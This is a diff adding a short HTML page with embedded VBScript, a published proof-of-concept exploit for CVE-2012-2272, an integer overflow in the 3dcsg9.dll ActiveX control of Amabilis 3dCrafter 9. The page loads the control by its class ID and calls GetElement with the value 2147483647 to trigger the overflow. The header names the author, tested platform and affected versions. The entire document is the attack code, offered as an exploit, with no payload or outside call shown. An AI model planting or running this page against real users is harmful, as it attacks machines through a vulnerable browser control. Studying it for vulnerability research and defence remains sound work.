@@ -1,0 +1,25 @@
+<html>
+<body>
+Exploitttttttttttt !!!!!!!!!!!!
+<object classid='clsid:75F121B7-B2C3-4150-AEDE-18237180AF04' id='target'></object> <script language='vbscript'>
+
+'Exploit title: Integer overflow in 3dcsg9.dll(3dCrafter 9 from Amabilis software)
+'Date: May 28, 2012
+'author: Saurabh Sharma(HCL Technologies) sharma_saurabh@hcl.com
+'Software Link: http://www.amabilis.com/downloads/3DCrafter91.msi
+'version: 9.1, 8.2
+'Tested on : XP SP2
+'CVE-2012-2272
+
+targetFile="C:\Program Files\3DCrafter 9\3dcsg9.dll"
+prototype = "Function GetElement (ByVal Index As Long) As _CSGLight"
+memberName = "GetElement"
+'progid = "TDCSG.CSGLightArray"
+argCount = 1
+
+arg1 = 2147483647
+
+target.GetElement arg1
+</script>
+</body>
+</html>
